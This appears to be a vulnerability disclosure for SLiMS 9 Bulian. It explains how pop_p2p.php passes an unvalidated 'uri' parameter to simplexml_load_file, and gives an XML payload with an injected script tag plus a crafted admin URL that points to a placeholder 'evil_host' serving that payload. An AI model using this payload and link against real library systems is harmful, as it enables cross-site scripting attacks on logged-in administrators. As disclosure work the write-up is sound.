# The issue

My machine learning model that are in progress for vulnerable code detection in php recently found the issues below
Issue Reference: `https://github.com/slims/slims9_bulian/issues/204`


# The explanation

it is straight forward that the bug is at the provided code which is at

```
$detail_uri = $_GET['uri'] . "/index.php?p=show_detail&inXML=true&id=" . $_GET['biblioID'];
// parse XML
$data = modsXMLsenayan($detail_uri, 'uri');
```


if we take a look at the function `modsXMLsenayan` or at https://github.com/slims/slims9_bulian/blob/ce0afea598cf9a81974b3ea5d150534337b7b695/lib/modsxmlsenayan.inc.php

we see that it loads an XML with `simplexml_load_file`

but how can we exploit it to add something or make it load?

the code of the pop_p2p.php is associated with the code p2p.php, in order to find how can we add something is to play around with the p2p.php.

how it works is that the p2p.php takes your keyword into `index.php?p=show_detail&inXML=true&id=ID_OF_BOOKS` which return an xml where then the XML is processed using the modsXMLsenayan

after its processed then some value from the xml are taken. from here to create our payload wheter it's XXE or perhaps XSS, all we need is the XML `from index.php?p=show_detail&inXML=true&id=ID_OF_BOOKS`

here's for an example for the case of XSS injection via XML to attack client/user/admin:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<modsCollection xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.loc.gov/mods/v3" xmlns:slims="http://slims.web.id" xsi:schemaLocation="http://www.loc.gov/mods/v3 http://www.loc.gov/standards/mods/v3/mods-3-3.xsd">
<mods version="3.3" id="1">
 <titleInfo>
  <title>PHP 5 for dummies</title>
 </titleInfo>
 <name type="Personal Name" authority="">
  <namePart>Valade, Janet</namePart>
  <role>
   <roleTerm type="text">Primary Author</roleTerm>
  </role>
 </name>
 <typeOfResource manuscript="no" collection="yes">mixed material</typeOfResource>
 <genre authority="marcgt">bibliography</genre>
 <originInfo>
  <place>
   <placeTerm type="text"><![CDATA[<script>alert("pwned by komangsughosa");</script>]]></placeTerm>
  </place>
  <publisher>Wiley</publisher>
  <dateIssued>2004</dateIssued>
 </originInfo>
 <language>
  <languageTerm type="code">en</languageTerm>
  <languageTerm type="text">English</languageTerm>
 </language>
 <physicalDescription>
  <form authority="gmd">Text</form>
  <extent>xiv, 392 p. : ill. ; 24 cm.</extent>
 </physicalDescription>
 <relatedItem type="series">
  <titleInfo/>
  <title>For dummies</title>
 </relatedItem>
 <note></note>
 <subject authority="">
  <topic>Programming</topic>
 </subject>
 <subject authority="">
  <topic>Website</topic>
 </subject>
 <classification>005.13/3 22</classification>
 <identifier type="isbn">0764541668</identifier>
 <location>
  <physicalLocation>Senayan Open Source Library Management System</physicalLocation>
  <shelfLocator>005.13/3-22 Jan p</shelfLocator>
 </location>
 <slims:image>php5_dummies.jpg</slims:image>
 <recordInfo>
  <recordIdentifier>1</recordIdentifier>
  <recordCreationDate encoding="w3cdtf">2007-11-29 15:36:50</recordCreationDate>
  <recordChangeDate encoding="w3cdtf">2007-11-29 16:26:59</recordChangeDate>
  <recordOrigin>machine generated</recordOrigin>
 </recordInfo>
</mods>
</modsCollection>
```

in order to launch the attack, all we need is to make victim visit the link trigger the ssrf BUT we need to point it to the hosted xml payload above for example:

`http://localhost/admin/modules/bibliography/pop_p2p.php?uri=http%3A%2F%2Fevil_host%2Fevil_payload.xml%23`

once the victim logged in, this will prompt an alert

<img width="1088" alt="image" src="https://github.com/komangsughosa/CVE-ID-not-yet/assets/116742485/42b40b3d-c6ea-4825-838e-53d74bc7074d">

